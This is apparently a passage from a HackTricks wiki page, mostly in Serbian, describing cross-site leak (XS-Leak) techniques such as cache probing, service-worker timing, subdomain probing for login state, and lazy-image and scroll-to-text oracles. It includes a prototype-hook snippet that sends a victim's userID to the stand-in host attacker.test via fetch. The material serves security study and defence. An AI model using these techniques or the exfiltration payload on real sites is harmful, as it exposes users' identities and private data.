3. **Download navigacija bez iframa**:
- Slično iframes tehnici, ova metoda koristi `window.open` umesto iframe-a.
- Praćenjem navigacionih događaja u novootvorenom prozoru može se otkriti da li je pokrenuto preuzimanje fajla (nema navigacije) ili se sadržaj prikazuje inline (navigacija se dešava).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti da indirektno zaključe stanje autentikacije korisnika na osnovu odgovora browser-a na zahtev za preuzimanje.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Metode uključivanja**: Pop-ups
- **Detektabilna razlika**: Timing
- **Više informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Sažetak:** An attacker can discern file downloads by leveraging iframes; continued accessibility of the iframe implies successful file download.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (from [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> This is why this technique is interesting: Chrome now has **cache partitioning**, and the cache key of the newly opened page is: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, but if I open an ngrok page and use fetch in it, the cache key will be: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, the **cache key is different**, so the cache cannot be shared. You can find more detail here: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Comment from [**here**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Ako sajt `example.com` uključi resurs sa `*.example.com/resource` onda će taj resurs imati **isti cache key** kao kada je resurs direktno zatražen kroz top-level navigaciju. To je zato što cache key sadrži top-level _eTLD+1_ i frame _eTLD+1_.

Pošto je pristup cache-u brži nego učitavanje resursa, moguće je pokušati promeniti lokaciju stranice i prekinuti je nakon, na primer, 20ms. Ako je origin promenjen nakon prekida, to znači da je resurs bio keširan.\
Alternativno, može se poslati fetch ka potencijalno keširanoj strani i meriti koliko vremena je potrebno za odgovor.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Metode uključivanja**: Fetch API
- **Detektabilna razlika**: Redirects
- **Više informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Sažetak:** It's possible to find out if a response to a fetch request is a redirect
- **Code Example**:

![](<../../images/image (769).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Metode uključivanja**: Fetch API
- **Detektabilna razlika**: Timing
- **Više informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Sažetak:** It's possible to try to load a resource and about before it's loaded the loading is interrupted. Depending on if an error is triggered, the resource was or wasn't cached.
- **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Koristi _**fetch**_ i _**setTimeout**_ zajedno sa **AbortController**-om da bi se i detektovalo da li je **resurs keširan** i da bi se izbacilo (evict) određeni resurs iz browser cache-a. Pored toga, proces se izvodi bez keširanja novog sadržaja.

### Script Pollution

- **Metode uključivanja**: HTML Elements (script)
- **Detektabilna razlika**: Page Content
- **Više informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Sažetak:** It's possible to **overwrite built-in functions** and read their arguments which even from **cross-origin script** (which cannot be read directly), this might **leak valuable information**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

#### Prototype hooks to exfiltrate module-scoped data

Predefiniši `Function.prototype.default` i `Function.prototype.__esModule = 1` pre učitavanja modula tako da njegov `default` export pozove tvoj hook (npr. primi `{userID: ...}`), što ti omogućava da pročitaš vrednosti iz opsega modula bez korišćenja timing-a ili brute-force tehnika.
```html
<script>
Function.prototype.default=(e)=>{if(typeof e.userID==="string")fetch("//attacker.test/?id="+e.userID)}
Function.prototype.__esModule=1
</script>
<script src="https://www.facebook.com/signals/iwl.js?pixel_id=PIXEL_ID"></script>
```
The request itself also becomes a login-state oracle if the script only loads for authenticated users.

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Metode uključivanja**: Pop-ups
- **Detektabilna razlika**: Sadržaj stranice
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Sažetak:** Izmeri vreme izvršavanja web stranice koristeći service workers.
- **Primer koda**:

U datom scenariju, attacker preduzima inicijativu da registruje **service worker** unutar jednog od svojih domena, konkretno "attacker.com". Zatim attacker otvara novi prozor na ciljanom sajtu iz glavnog dokumenta i naređuje **service worker**-u da započne tajmer. Dok se novi prozor počinje učitavati, attacker preusmerava referencu dobijenu u prethodnom koraku na stranicu kojom rukovodi **service worker**.

Kada stigne zahtev iniciran u prethodnom koraku, **service worker** odgovara sa **204 (No Content)** status kodom, efektivno prekidajući navigacioni proces. U tom trenutku, **service worker** uzima merenje sa tajmera pokrenutog ranije u koraku dva. Ovo merenje je pod uticajem trajanja JavaScript-a koji uzrokuje kašnjenja u procesu navigacije.

> [!WARNING]
> U execution timing napadu moguće je **eliminisati** **mrežne faktore** kako bi se dobila **preciznija merenja**. Na primer, učitavanjem resursa koje stranica koristi pre njenog učitavanja.

### Fetch Timing

- **Metode uključivanja**: Fetch API
- **Detektabilna razlika**: Vremensko (obično zbog sadržaja stranice, status koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Sažetak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršenje zahteva. Mogu se koristiti i drugi časovnici.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Metode uključivanja**: Pop-ups
- **Detektabilna razlika**: Vremensko (obično zbog sadržaja stranice, status koda)
- **Više informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Sažetak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvršenje zahteva koristeći `window.open`. Mogu se koristiti i drugi časovnici.
- **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

### Subdomain probing for identity/login state

- **Metode uključivanja**: HTML Elements (script), Frames
- **Detektabilna razlika**: DNS/HTTP uspeh učitavanja, CORB/izmene header-a
- **Sažetak:** Ako se identifikatori nalaze u labelama subdomena (npr., `www.<username>.sb.facebook.com`), zahtevajte resurse na kandidat hostovima i tretirajte `onload` naspram `onerror`/timeout-a kao Boolean. Kombinujte sa login-only skriptama (npr., `/signals/iwl.js`) da brute-force-ujete korisnička imena i verifikujete auth za povezane entitete.
- **Napomena:** Signale je moguće pojačati različitim tipovima uključivanja (`script`, `iframe`, `object`) da bi se detektovale razlike u `X-Frame-Options`, `CORB`, ili preusmerenjima po kandidatu.

## With HTML or Re Injection

Ovde možete pronaći tehnike za eksfiltraciju informacija iz cross-origin HTML-a kada ubacujete **HTML sadržaj**. Ove tehnike su interesantne u slučajevima kada iz nekog razloga možete **ubaciti HTML ali ne možete ubaciti JS kod**.

### Dangling Markup


{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Ako treba da **eksfiltrirate sadržaj** i možete **dodati HTML pre tajne**, trebalo bi da proverite **uobičajene dangling markup tehnike**.\
Međutim, ako iz bilo kog razloga **MUST** to uradite **karakter po karakter** (možda je komunikacija preko cache hit-a) možete upotrebiti ovaj trik.

**Slike** u HTML-u imaju atribut "**loading**" čija vrednost može biti "**lazy**". U tom slučaju, slika će se učitati kada bude prikazana, a ne dok se stranica učitava:
```html
<img src=/something loading=lazy >
```
Dakle, ono što možete uraditi jeste da **dodate puno beskorisnih karaktera** (na primer **hiljade "W"-ova**) da **popunite web stranicu pre tajne ili dodate nešto kao** `<br><canvas height="1850px"></canvas><br>`.\
Zatim, na primer, ako se naša **injection** pojavi pre **flag**, **slika** će biti **učitana**, ali ako se pojavi **nakon** **flag**, flag + smeće će **sprečiti njeno učitavanje** (biće potrebno eksperimentisati koliko smeća postaviti). Ovo je ono što se desilo u [**this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

Međutim, napravite da **bot pristupi stranici** sa nečim poput
```
#:~:text=SECR
```
Dakle, web stranica će biti nešto kao: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrži beskorisne znakove koje ubacuje napadač i lazy load image, a zatim se doda tajna bota.

Ovaj tekst će naterati bota da pristupi bilo kojem tekstu na stranici koji sadrži tekst `SECR`. Pošto je taj tekst tajna i nalazi se odmah **ispod slike**, **slika će se učitati samo ako je pogođena tajna tačna**. Tako imate svoj oracle za **exfiltrate the secret char by char**.

Some code example to exploit this: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Image Lazy Loading Time Based

If it's **not possible to load an external image** that could indicate the attacker that the image was loaded, another option would be to try to **guess the char several times and measure that**. If the image is loaded all the requests would take longer that if the image isn't loaded. This is what was used in the [**solution of this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sažeto ovde:**


{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS


{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

If `jQuery(location.hash)` is used, it's possible to find out via timing i**ako neki HTML sadržaj postoji**, ovo je zato što ako selektor `main[id='site-main']` ne odgovara, ne treba da proverava ostatak **selectors**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection


{{#ref}}
css-injection/
{{#endref}}

## Odbrane

Postoje mere koje se preporučuju u [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), kao i u svakoj sekciji wiki-ja [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo za više informacija o tome kako se zaštititi od ovih tehnika.

## Reference

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)
- [Cross-Site Leaks (XS-Leaks) across Meta platforms](https://ysamm.com/uncategorized/2026/01/16/cross-site-leaks.html)

{{#include ../../banners/hacktricks-training.md}}
